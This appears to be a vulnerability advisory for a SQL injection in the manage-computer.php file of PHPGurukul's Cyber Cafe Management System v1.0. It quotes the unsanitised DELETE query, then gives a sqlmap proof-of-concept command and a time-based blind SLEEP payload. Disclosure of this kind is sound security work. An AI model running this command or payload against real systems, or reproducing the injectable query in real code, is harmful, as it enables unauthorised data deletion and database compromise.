# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file manage-computer.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- manage-computer.php

**Version**

- V1.0

### Analyse

manage-computer.php:10-12

```
if($_GET['del']){
$catid=$_GET['id'];
mysqli_query($con,"delete from tblcomputers where ID ='$catid'");
```

- **参数**: `id` (GET)
- **类型**: DELETE注入
- **危害**: 可删除任意数据或执行其他恶意SQL

### POC

```bash
sqlmap -u "http://192.168.93.1/ccms/manage-computer.php?id=1&del=delete" --cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --level=2
```

```bash
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: id=1' RLIKE SLEEP(5) AND 'WxxG'='WxxG&del=delete
---
```

![image-20251212114554389](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121145458.png)